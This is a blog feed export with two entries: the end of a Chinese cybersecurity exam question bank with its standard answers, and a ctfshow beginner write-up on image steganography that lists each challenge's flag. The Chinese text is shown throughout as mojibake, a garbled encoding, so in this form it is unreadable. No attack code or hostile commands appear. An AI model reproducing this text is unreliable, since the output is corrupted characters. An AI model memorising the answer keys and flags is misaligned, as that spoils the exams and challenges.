‡å‡†ç­”æ¡ˆï¼šABC<br>19ã€æµ‹è¯„æ´»åŠ¨çš„ä¸»è¦å†…å®¹æœ‰<br>Aã€å·¥å…·å’Œè¡¨å•å‡†å¤‡<br>Bã€ä¿¡æ¯æ”¶é›†å’Œåˆ†æ<br>Cã€æµ‹è¯„å‡†å¤‡æ´»åŠ¨è¾“å‡ºæ–‡æ¡£<br>Dã€é¡¹ç›®å¯åŠ¨<br>æ ‡å‡†ç­”æ¡ˆï¼šABCD<br>20ã€ä¸ªäººä¿¡æ¯ä¸­çš„ç½‘ç»œèº«ä»½æ ‡è¯†ä¿¡æ¯åŒ…æ‹¬<br>Aã€ç¡¬ä»¶åºåˆ—å·<br>Bã€IPåœ°å€<br>Cã€ç”¨æˆ·ä¸ªäººæ•°å­—è¯ä¹¦<br>Dã€ç³»ç»Ÿç¼–å·<br>æ ‡å‡†ç­”æ¡ˆï¼šBCD<br>21ã€ä¿éšœä¼ä¸šä¿¡æ¯åœ¨å­˜å‚¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„(),(),()å’Œä¸å¯æŠµèµ–æ€§ï¼Œæ˜¯ç½‘ç»œå®‰å…¨çš„ç›®æ ‡ä¹‹ä¸€ã€‚<br>Aã€å…¨é¢æ€§<br>Bã€å®Œæ•´æ€§<br>Cã€åˆæ³•æ€§<br>Dã€ä¿å¯†æ€§<br>æ ‡å‡†ç­”æ¡ˆï¼šBCD<br>22ã€å·¥ä¸šæ§åˆ¶ç³»ç»Ÿå› å…¶ç‰¹æ®Šæ€§ä»¥åŠå¯¹å…¶ç¨³å®šæ€§çš„è¦æ±‚ä¸èƒ½å¤Ÿç»å¸¸æ›´æ–°ç³»ç»Ÿï¼Œæ‰€ä»¥å¯¼è‡´äº†å·¥ä¸šæ§åˆ¶ç³»ç»Ÿæ¼æ´ç™¾å‡ºï¼Œå…¶ä¸­å¸¸è§çš„æ¼æ´ç±»å‹æœ‰ï¼ˆï¼‰<br>Aã€æ‹’ç»æœåŠ¡æ¼æ´<br>Bã€è®¿é—®æ§åˆ¶æ¼æ´<br>Cã€ä¿¡æ¯æ³„éœ²æ¼æ´<br>Dã€è·¯å¾„éå†æ¼æ´<br>æ ‡å‡†ç­”æ¡ˆï¼šABCD<br>23ã€ã€Šç½‘ç»œå®‰å…¨æ³•ã€‹çš„æ„ä¹‰åŒ…æ‹¬ï¼ˆï¼‰ã€‚<br>Aã€è½å®å…šä¸­å¤®å†³ç­–éƒ¨ç½²çš„é‡è¦ä¸¾æª<br>Bã€ç»´æŠ¤ç½‘ç»œå®‰å…¨çš„å®¢è§‚éœ€è¦<br>Cã€ç»´æŠ¤æ°‘ä¼—åˆ‡èº«åˆ©ç›Šçš„å¿…ç„¶è¦æ±‚<br>Dã€å‚ä¸äº’è”ç½‘å›½é™…ç«äº‰å’Œå›½é™…æ²»ç†çš„å¿…ç„¶é€‰æ‹©<br>æ ‡å‡†ç­”æ¡ˆï¼šABCD<br>24ã€ã€Šä¿¡æ¯ç³»ç»Ÿç­‰çº§ä¿æŠ¤å®‰å…¨è®¾è®¡æŠ€æœ¯è¦æ±‚ã€‹è¦æ±‚(),(),()å’Œå®‰å…¨ç®¡ç†ä¸­å¿ƒ<br>Aã€å®‰å…¨è®¡ç®—ç¯å¢ƒ<br>Bã€å®‰å…¨åŒºåŸŸè¾¹ç•Œ<br>Cã€å®‰å…¨é€šä¿¡ç½‘ç»œ<br>Dã€å®‰å…¨è¿è¥ä¸­å¿ƒ<br>æ ‡å‡†ç­”æ¡ˆï¼šABC<br>25ã€æµ‹è¯„æŒ‡æ ‡åœ¨æŠ€æœ¯/ç®¡ç†å±‚é¢åŒ…æ‹¬ï¼š<br>Aã€å®‰å…¨æŠ€æœ¯<br>Bã€äººå‘˜å®‰å…¨æ„è¯†<br>Cã€å®‰å…¨æ¼æ´<br>Dã€å®‰å…¨ç®¡ç†<br>æ ‡å‡†ç­”æ¡ˆï¼šAD<br>26ã€ä»¥ä¸‹å“ªäº›æ˜¯å¯†ç è¯¯ç”¨çš„ä¾‹å­<br>Aã€VPNé…ç½®ç­–ç•¥ä¸å½“<br>Bã€SSLä½¿ç”¨æ— æ•ˆè¯ä¹¦ï¼Œå®¢æˆ·ç«¯å­˜åœ¨è¯ä¹¦æ ¡éªŒé—®é¢˜<br>Cã€Androidåº”ç”¨ä¾èµ–ç¬¬ä¸‰æ–¹å‡½æ•°åº“å¯¼è‡´å„ç§å¯†ç å­¦è¯¯ç”¨é—®é¢˜<br>Dã€åœ¨å¤§éƒ¨åˆ†åµŒå…¥å¼è®¾å¤‡ä¸­ï¼Œå”¯ä¸€çš„ç†µæºåªèƒ½æ˜¯ä¸­æ–­äº‹ä»¶ï¼Œç†µæºä¸è¶³ï¼Œå½±å“éšæœºæ•°äº§ç”Ÿçš„å®‰å…¨æ€§<br>æ ‡å‡†ç­”æ¡ˆï¼šABCD<br>27ã€ç½‘ç»œè¿è¥è€…åŒ…æ‹¬ï¼ˆï¼‰ã€‚<br>Aã€ç½‘ç»œæ‰€æœ‰è€…<br>Bã€ç½‘ç»œç®¡ç†è€…<br>Cã€ç½‘ç»œä½¿ç”¨è€…<br>Dã€ç½‘ç»œæœåŠ¡æä¾›è€…<br>æ ‡å‡†ç­”æ¡ˆï¼šABD<br>28ã€é›¶ä¿¡ä»»å®‰å…¨æ¶æ„çš„ç†å¿µå¯ç®€å•æ¦‚æ‹¬ä¸ºï¼ˆ )<br>Aã€è¦å§‹ç»ˆå‡è®¾ç½‘ç»œå……æ»¡å¨èƒï¼Œå¤–éƒ¨å’Œå†…éƒ¨å¨èƒæ¯æ—¶æ¯åˆ»éƒ½å……æ–¥ç€ç½‘ç»œ<br>Bã€ä¸èƒ½ä»…ä»…ä¾é ç½‘ç»œä½ç½®æ¥å»ºç«‹ä¿¡ä»»å…³ç³»<br>Cã€æ‰€æœ‰ç”¨æˆ·ã€è®¾å¤‡å’Œç½‘ç»œæµé‡éƒ½åº”è¯¥è¢«è®¤è¯å’Œæˆæƒ<br>Dã€è®¿é—®æ§åˆ¶ç­–ç•¥åº”è¯¥åŠ¨æ€åœ°ã€åŸºäºå°½é‡å¤šçš„æ•°æ®æºè¿›è¡Œè®¡ç®—å’Œè¯„ä¼°<br>æ ‡å‡†ç­”æ¡ˆï¼šABCD<br>29ã€å…¥ä¾µæ£€æµ‹ç³»ç»Ÿçš„åŠŸèƒ½åŒ…å«ä»¥ä¸‹å“ªäº›é€‰é¡¹ï¼Ÿ<br>Aã€è¿‡æ»¤éæ³•æ•°æ®åŒ…<br>Bã€ç›‘è§†é€šä¿¡æ•°æ®æµ<br>Cã€æ•è·å¯ç–‘çš„ç½‘ç»œè¡Œä¸º<br>Dã€ç”Ÿæˆå®‰å…¨å®¡è®¡æŠ¥å‘Š<br>æ ‡å‡†ç­”æ¡ˆï¼šBCD<br>30ã€æ€åŠ¿æ„ŸçŸ¥å±‚äº§å“å¤„äºäº§å“ç»“æ„çš„é¡¶å±‚ï¼Œå…¶æ ¸å¿ƒèƒ½åŠ›æ˜¯ï¼ˆ ï¼‰<br>Aã€é›†ä¸­ç®¡æ§<br>Bã€æƒ…æŠ¥æœé›†<br>Cã€æ•°æ®é«˜çº§åˆ†æ<br>Dã€æ•°æ®é‡‡é›†<br>æ ‡å‡†ç­”æ¡ˆï¼šBC<br>ä¸‰ã€åˆ¤æ–­é¢˜<br>1ã€ä¸ªäººä¿¡æ¯ä¿å­˜ä¸­ä¸ªäººä¿¡æ¯æ§åˆ¶è€…ä¼ è¾“å’Œå­˜å‚¨æ•æ„Ÿä¿¡æ¯æ—¶ï¼Œåº”é‡‡ç”¨åŠ å¯†ç­‰å®‰å…¨æªæ–½ã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>2ã€è®¡ç®—æœºåœºåœ°åœ¨æ­£å¸¸æƒ…å†µä¸‹æ¸©åº¦ä¿æŒåœ¨18 - 28æ‘„æ°åº¦ã€‚ï¼ˆï¼‰<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>3ã€DNSå±äºåº”ç”¨å±‚åè®®ï¼Œæ—¢å¯ä»¥ä½¿ç”¨TCPåè®®ï¼Œåˆå¯ä»¥ä½¿ç”¨UDPåè®®ã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>4ã€æ•°å­—ç­¾åè¿‡ç¨‹ä¸­ï¼Œå…ˆå¯¹æ¶ˆæ¯åŠ å¯†ï¼Œå†å¯¹åŠ å¯†æ¶ˆæ¯è®¡ç®—æ•£åˆ—å€¼å¹¶é™„åŠ åœ¨æ¶ˆæ¯ä¹‹åã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>5ã€æ•°æ®å®‰å…¨çš„ä¿å¯†æ€§å°±æ˜¯æŒ‡ï¼Œæ•°æ®ä»…èƒ½è¢«åº”è¯¥çŸ¥æ‚‰çš„ç”¨æˆ·æˆ–å®ä½“è¯»å–å’Œç†è§£ï¼Œå…¶ä»–å®ä½“ä¸èƒ½è¯»å–æ•°æ®æˆ–ç†è§£æ•°æ®çš„å«ä¹‰ï¼ˆï¼‰ã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>6ã€ç½‘ç»œå®‰å…¨æ»‘åŠ¨æ ‡å°ºæ¨¡å‹éœ€è¦æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºå»ºè®¾ï¼Œå…¶ä¸­è¢«åŠ¨é˜²å¾¡å’Œç§¯æé˜²å¾¡å‡éœ€è¦äººå‘˜çš„ä»‹å…¥ã€‚ï¼ˆ ï¼‰<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>7ã€åŸºäºä¸»æœºçš„æ•°æ®å¤‡ä»½ï¼Œè¯¥å¤‡ä»½æ–¹å¼æ˜¯å°†å­˜å‚¨è®¾å¤‡ç›´æ¥æ¥åœ¨äº‘ä¸»æœºä¸Šï¼Œè€Œä¸”è¿˜ä¸ºå…¶ä»–æœåŠ¡å™¨æä¾›æ•°æ®å¤‡ä»½æœåŠ¡ã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>8ã€åœ¨å¤šå±‚å¯†é’¥ä½“ç³»ä¸­ï¼Œä¸€æ—¦ä¸‹å±‚å¯†é’¥æ³„éœ²ï¼Œä¸Šå±‚å¯†é’¥çš„å®‰å…¨æ€§ä¼šè¡ç„¶æ— å­˜ã€‚ï¼ˆï¼‰<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>9ã€åŸºäºå¨èƒæƒ…æŠ¥çš„å·¥ä¸šå¨èƒæ£€æµ‹æŠ€æœ¯ï¼Œå¯¹äºå—å®³ç›®æ ‡åŠæ”»å‡»æºå¤´çš„ç²¾å‡†å®šä½å¹¶ä¸èƒ½äº§ç”Ÿè¾ƒç†æƒ³çš„æ•ˆæœã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>10ã€å®‰å…¨é£é™©è¯„ä¼°æ˜¯ä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤å»ºè®¾çš„é‡è¦ç§‘å­¦æ–¹æ³•ä¹‹ä¸€ï¼Œå¯ä»¥è¿ç”¨åˆ°ç­‰çº§ä¿æŠ¤å‘¨æœŸçš„ç³»ç»Ÿå®šçº§ã€å®‰å…¨å®æ–½å’Œå®‰å…¨è¿ç»´ç­‰é˜¶æ®µã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>11ã€åŸºäºç”¨æˆ·æ•°æ®å®‰å…¨çš„ä¿æŠ¤ï¼Œå¦‚æœæ˜¯é‡è¦çš„æ•°æ®ï¼Œå¯è¿›è¡Œå¼‚åœ°å­˜å‚¨ã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>12ã€ç”±äºå·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¸­ä¼ è¾“çš„æ•°æ®é€šå¸¸æ˜¯æŒ‡ä»¤å’Œé‡‡é›†çš„åŸå§‹æ•°æ®ï¼Œè€Œä¸”å¤šä¸ºå®æ—¶æ•°æ®ï¼Œå› æ­¤ç›¸å¯¹äºå®Œæ•´æ€§å’Œå¯ç”¨æ€§è€Œè¨€ï¼Œå¯¹ä¿å¯†æ€§è¦æ±‚æœ€é«˜ã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>13ã€å·¥ä¸šå®‰å…¨æ£€æŸ¥è¯„ä¼°å·¥å…·å¤šä¸ºä¾¿æºå¼è®¾å¤‡ï¼Œå¸¦æœ‰é«˜æ¸…æ˜¾ç¤ºå±å¹•ï¼Œä¸”åªéœ€æ¥å…¥é•œåƒæµé‡å³å¯ï¼Œæ— é¡»å¤æ‚é…ç½®ã€‚ä½¿ç”¨åœ¨çº¿æ—è·¯éƒ¨ç½²æ–¹å¼ï¼Œé‡‡ç”¨ä¸»åŠ¨æ¨¡å¼æ£€æŸ¥ã€‚ï¼ˆ ï¼‰<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>14ã€ã€Šç½‘ç»œå®‰å…¨æ³•ã€‹ä¸ºæ•´å¥—çš„æ³•è§„ã€è§„ç« é¢„ç•™äº†æ¥å£ã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>15ã€å®¹ç¾ï¼Œå°±æ˜¯å‡å°‘ç¾éš¾äº‹ä»¶å‘ç”Ÿçš„å¯èƒ½æ€§ä»¥åŠé™åˆ¶ç¾éš¾å¯¹å…³é”®ä¸šåŠ¡æµç¨‹æ‰€é€ æˆçš„å½±å“çš„ä¸€æ•´å¥—è¡Œä¸ºï¼ˆï¼‰ã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>16ã€å…³äºæµ‹è¯„å‡†å¤‡æ´»åŠ¨ä¸­ä¿¡æ¯æ”¶é›†ä¸åˆ†æä»»åŠ¡çš„è¾“å‡ºæ–‡æ¡£ä¸ºå¡«å¥½çš„è°ƒæŸ¥è¡¨æ ¼å’Œå„ç§ä¸è¢«æµ‹ä¿¡æ¯ç³»ç»Ÿç›¸å…³çš„èµ„æ–™ã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>17ã€é€šè¿‡åšå¥½å¿…è¦çš„åˆ†éš”ç®¡æ§å·¥ä½œå¯ä»¥å‡å°‘å·¥ä¸šæ§åˆ¶ç³»ç»Ÿåœ¨æ¥å…¥äº’è”ç½‘åè¢«æ”»å‡»çš„é£é™©ã€‚ï¼ˆ ï¼‰<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>18ã€å·¥ä¸šäº’è”ç½‘æ˜¯è¿æ¥Iä¸šå…¨ç³»ç»Ÿã€å…¨äº§ä¸šé“¾ã€å…¨ä»·å€¼é“¾ï¼Œæ”¯æ’‘å·¥ä¸šæ™ºèƒ½åŒ–å‘å±•çš„å…³é”®åŸºç¡€è®¾æ–½ï¼Œæ˜¯äº’è”ç½‘ä»æ¶ˆè´¹é¢†åŸŸå‘ç”Ÿäº§é¢†åŸŸã€ä»è™šæ‹Ÿç»æµå‘å®ä½“ç»æµæ‹“å±•çš„æ ¸å¿ƒè½½ä½“ã€‚ï¼ˆ ï¼‰<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>19ã€é€ æˆå·¥ä¸šæ§åˆ¶ç³»ç»Ÿæš´éœ²çš„ä¸»è¦åŸå› ä¹‹ä¸€æ˜¯â€œå•†ä¸šç½‘ç»œâ€å’Œâ€œå·¥ä¸šç½‘ç»œâ€çš„ä¸æ–­èåˆã€‚ï¼ˆ ï¼‰<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>20ã€åœ¨ç¬”è®°æœ¬ç”µè„‘æ„ŸæŸ“å‹’ç´¢ç—…æ¯’åè¿›è¡Œç‰©ç†éš”ç¦»æ–­ç½‘æ“ä½œï¼Œæ‹”æ‰ç½‘çº¿ã€ç¦ç”¨ç½‘å¡å³å¯ã€‚ï¼ˆ ï¼‰<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>21ã€é’ˆå¯¹å·¥ä¸šæ§åˆ¶ç³»ç»Ÿçš„æ”»å‡»ï¼Œæ”»å‡»è€…çš„ä¸»è¦ç›®çš„æ˜¯è·å–å•†ä¸šæƒ…æŠ¥ã€æµç¨‹å·¥è‰ºï¼Œè¿›è¡Œè¿œç¨‹æ§åˆ¶æˆ–è€…æ¶æ„ç ´åã€‚ï¼ˆ ï¼‰<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šA<br>22ã€ç¬¬ä¸‰æ–¹å…¬å¸äººå‘˜åˆ°å…¬å¸æ´½è°ˆä¸šåŠ¡ï¼ŒæœŸé—´å‘æ‚¨è¦å…¬å¸æ— çº¿ç½‘ç»œçš„è´¦å·å¯†ç ï¼Œæ‚¨ç›´æ¥ç»™ä»–ä¸€ä¸ªå…¬ç”¨çš„è´¦å·å¯†ç ã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>23ã€ç­‰çº§ä¿æŠ¤åŸºæœ¬è¦æ±‚ä¸­çš„ä¸‰çº§ä¸»æœºå®‰å…¨è¦æ±‚ï¼šå¢åŠ å¯¹ç™»å½•å¤±è´¥ã€å®‰å…¨ä¼ è¾“ã€å£ä»¤å¤æ‚åº¦ç­‰è¦æ±‚ï¼Œå¢åŠ ç‰¹æƒåˆ†ç¦»è¦æ±‚ï¼Œå¢åŠ å®¡è®¡è®°å½•ä¿æŠ¤è¦æ±‚ï¼Œå¢åŠ è¡¥ä¸åŠæ—¶æ›´æ–°è¦æ±‚ï¼Œå¢åŠ è½¯ä»¶ç»Ÿä¸€ç®¡ç†è¦æ±‚ï¼Œå¢åŠ å•ä¸ªä¸šåŠ¡åº”ç”¨ä½¿ç”¨ç³»ç»Ÿèµ„æºçš„é™åˆ¶è¦æ±‚ã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šB<br>24ã€é«˜ä¸­ä½ä½èƒ½åŠ›å®‰å…¨äº§å“ä½“ç³»ä¸­ï¼Œå®‰å…¨è¿è¥å±‚çš„æ ¸å¿ƒèƒ½åŠ›æ˜¯æƒ…æŠ¥æœé›†å’Œæ•°æ®é«˜çº§åˆ†æã€‚<br>Aã€æ­£ç¡®<br>Bã€é”™è¯¯<br>æ ‡å‡†ç­”æ¡ˆï¼šB</p><hr><p>é™„ä¸ŠæŠ€èƒ½èµ›ç­¾åˆ°çš„ä¸€äº›é¢˜</p><p>åœ¨æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œ <strong>å£ä»¤ä¿æŠ¤</strong> æ˜¯ä¿¡æ¯ç³»ç»Ÿçš„ç¬¬ä¸€é“å±éšœã€‚</p><p>ä¸ºäº†é˜²æ­¢ç‰©ç†ä¸Šå–èµ°æ•°æ®åº“è€Œé‡‡å–çš„åŠ å¼ºæ•°æ®åº“å®‰å…¨çš„æ–¹æ³•æ˜¯ <strong>æ•°æ®åº“åŠ å¯†</strong> ã€‚</p><p>å‘ç”Ÿ <strong>ä»‹è´¨æ•…éšœ</strong> åï¼Œç£ç›˜ä¸Šçš„ç‰©ç†æ•°æ®å’Œæ—¥å¿—æ–‡ä»¶è¢«ç ´åï¼Œè¿™æ˜¯æœ€ä¸¥é‡çš„ä¸€ç§æ•…éšœï¼Œæ¢å¤æ–¹æ³•æ˜¯é‡è£…æ•°æ®åº“ï¼Œç„¶åé‡åšå·²å®Œæˆçš„äº‹åŠ¡ã€‚</p><p>åœ¨æ•°æ®åº“çš„å®‰å…¨è¯„ä¼°è¿‡ç¨‹ä¸­ï¼Œä¸‹é¢é‚£é¡¹æ˜¯æŒ‡ç³»ç»Ÿèƒ½å¤Ÿå¯¹ä»˜å„ç§å¯èƒ½çš„æ”»å‡»çš„èƒ½åŠ›ã€‚    <strong>å¯è¡Œæ€§</strong></p><p>æ•°æ®åº“è®¿é—®æ§åˆ¶ç­–ç•¥ä¸­ï¼Œ <strong>åªéœ€ç­–ç•¥</strong> æ˜¯åªè®©ç”¨æˆ·å¾—åˆ°æœ‰ç›¸åº”æƒé™çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æ°åˆ°å¯ä»¥è®©ç”¨æˆ·å®Œæˆè‡ªå·±çš„å·¥ä½œï¼Œå…¶ä»–çš„æƒåˆ©ä¸€å¾‹ä¸ç»™ã€‚</p><p>æ•°æ®åº“çš„ <strong>å®‰å…¨ç­–ç•¥</strong> æ˜¯æŒ‡å¦‚ä½•ç»„ç»‡ã€ç®¡ç†ã€ä¿æŠ¤å’Œå¤„ç†æ•æ„Ÿä¿¡æ¯çš„æŒ‡å¯¼æ€æƒ³ã€‚å®ƒåŒ…æ‹¬å®‰å…¨ç®¡ç†ç­–ç•¥ã€è®¿é—®æ§åˆ¶ç­–ç•¥å’Œä¿¡æ¯æ§åˆ¶ç­–ç•¥ã€‚</p><p>æ•°æ®åº“çš„åŠ å¯†æ–¹æ³•ä¸­ï¼Œé‡‡ç”¨ <strong>åº“å¤–åŠ å¯†</strong> ï¼Œåˆ™å¯†é’¥ç®¡ç†è¾ƒä¸ºç®€å•ï¼Œåªéœ€å€Ÿç”¨æ–‡ä»¶åŠ å¯†çš„å¯†é’¥ç®¡ç†æ–¹æ³•ã€‚</p><p>åœ¨ä¸‹é¢çš„åŠ å¯†æ–¹æ³•ä¸­ï¼Œå“ªä¸ªåŠ è§£å¯†çš„æ•ˆç‡æœ€ä½ï¼š <strong>å…ƒç´ åŠ å¯†</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çº¢æ˜è°·æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-Miscå…¥é—¨</title>
      <link href="2021/03/29/ctfshow-Misc%E5%85%A5%E9%97%A8/"/>
      <url>2021/03/29/ctfshow-Misc%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ­¤ç³»åˆ—ä¸ºMiscå…¥é—¨å›¾ç‰‡ç¯‡ï¼Œä¸å®šæœŸæ›´æ–°ï¼›<br>ç›®çš„æ˜¯ä»‹ç» Misc æ–¹å‘ä¸­ä¸å›¾ç‰‡ç›¸å…³çš„å¸¸è§å‡ºé¢˜ç‚¹ï¼›<br>é¢˜ç›®æŒ‰ç…§çŸ¥è¯†ç‚¹åˆ†ç±»ï¼Œå¹¶å°½é‡ä¿è¯éš¾åº¦ä¸ºå…¥é—¨æ°´å¹³ï¼›<br> å¤§éƒ¨åˆ†é¢˜ç›®ä»…æ¶‰åŠå•ä¸€çŸ¥è¯†ç‚¹ï¼Œä½†å¯èƒ½æœ‰å¤šç§è§£æ³•ï¼›<br>æ‰¾åˆ°flagå¹¶ä¸å›°éš¾ï¼Œå…³é”®æ˜¯äº†è§£æ¯ä¸€é¢˜èƒŒåçš„åŸç†ï¼›<br>è—åœ¨å“ªï¼Ÿä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·è—ï¼Ÿè¯·å¤šè€ƒè™‘è¿™ä¸¤ä¸ªé—®é¢˜ï¼›<br>æ‰ç–å­¦æµ…ï¼Œäººèœæ‰‹æ®‹ï¼Œè‹¥æœ‰é”™æ¼ä¹‹å¤„ï¼Œè¿˜æœ›æŒ‡å‡ºï¼›<br> å¸Œæœ›èƒ½å¯¹åˆšæ¥è§¦ Misc æ–¹å‘çš„æœ‹å‹æœ‰æ‰€å¸®åŠ©ã€‚  </p></blockquote><h1 id="å›¾ç‰‡ç¯‡-åŸºç¡€æ“ä½œ"><a href="#å›¾ç‰‡ç¯‡-åŸºç¡€æ“ä½œ" class="headerlink" title="å›¾ç‰‡ç¯‡(åŸºç¡€æ“ä½œ)"></a>å›¾ç‰‡ç¯‡(åŸºç¡€æ“ä½œ)</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>å›¾ç‰‡å³æ˜¯flagï¼šctfshow{22f1fb91fc4169f1c9411ce632a0ed8d}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc1.png"></p><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p>010æ‰“å¼€å‘ç°æ˜¯å¼ pngå›¾ç‰‡ï¼Œäºæ˜¯æ”¹åç¼€ä¸ºpngå³å¯è·å–flagï¼šctfshow{6f66202f21ad22a2a19520cdd3f69e7b}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc2.png"></p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>é†‰äº†å‘€ï¼bpgè¿™éƒ½æ˜¯ä»€ä¹ˆè¿œå¤å›¾ç‰‡å‘€~<br>å…¨ç½‘å°±ä¸€ä¸ªè½¯ä»¶èƒ½æ‰“å¼€å®ƒï¼ˆbpgviewerï¼›æ‰“å¼€å³å¯è·å¾—flagï¼šctfshow{aade771916df7cde3009c0e631f9910d}</p><p><a href="https://pan.baidu.com/s/1jiLh2ECc2v_xafBAHgaHYg"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šlk1bï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/99778520112456.png"></p><h2 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h2><p>æ‹¼æ¥èµ·æ¥å°±æ˜¯flagï¼šctfshow{4314e2b15ad9a960e7d9d8fc2ff902da}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/55.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4155526497885.png"></p><h1 id="å›¾ç‰‡ç¯‡-ä¿¡æ¯é™„åŠ "><a href="#å›¾ç‰‡ç¯‡-ä¿¡æ¯é™„åŠ " class="headerlink" title="å›¾ç‰‡ç¯‡(ä¿¡æ¯é™„åŠ )"></a>å›¾ç‰‡ç¯‡(ä¿¡æ¯é™„åŠ )</h1><h2 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h2><p>010æ‰“å¼€åˆ’åˆ°åº•éƒ¨å‘ç°flagï¼šctfshow{2a476b4011805f1a8e4b906c8f84083e}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/R%7DV83GT@6~IX9TE7$Z$$2%7DQ.png"></p><h2 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h2><p>010æ‰“å¼€ç›´æ¥æœctfshowå°±èƒ½å¾—åˆ°flagï¼šctfshow{d5e937aefb091d38e70d927b80e1e2ea}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/41254148526896255.png"></p><h2 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h2><blockquote><p>flagåœ¨å›¾ç‰‡æ–‡ä»¶ä¿¡æ¯ä¸­ã€‚</p></blockquote><p>ç›´æ¥æ¢æˆtxtæ‰“å¼€Ctrl+F5æœctfshowå¾—åˆ°flagï¼šctfshow{c5e77c9c289275e3f307362e1ed86bb7}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/44422144557587.png"></p><h2 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h2><blockquote><p>flagåœ¨å›¾ç‰‡æ–‡ä»¶ä¸­å›¾ç‰‡æ–‡ä»¶ä¸­ã€‚</p></blockquote><p>ç›´æ¥ä¸Šæ¥å°±æ˜¯ä¸€é€šbinwalkã€foremostå¾—åˆ°flagï¼šctfshow{1df0a9a3f709a2605803664b55783687}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4865589552.png"></p><h2 id="misc9"><a href="#misc9" class="headerlink" title="misc9"></a>misc9</h2><blockquote><p>flagåœ¨å›¾ç‰‡å—é‡Œã€‚</p></blockquote><p>å›¾ç‰‡å—==æ•°æ®å—ï¼›åˆæ˜¯ç›´æ¥010æ‰“å¼€æœctfshowå°±èƒ½å¾—åˆ°flagï¼šctfshow{5c5e819508a3ab1fd823f11e83e93c75}</p><p><img 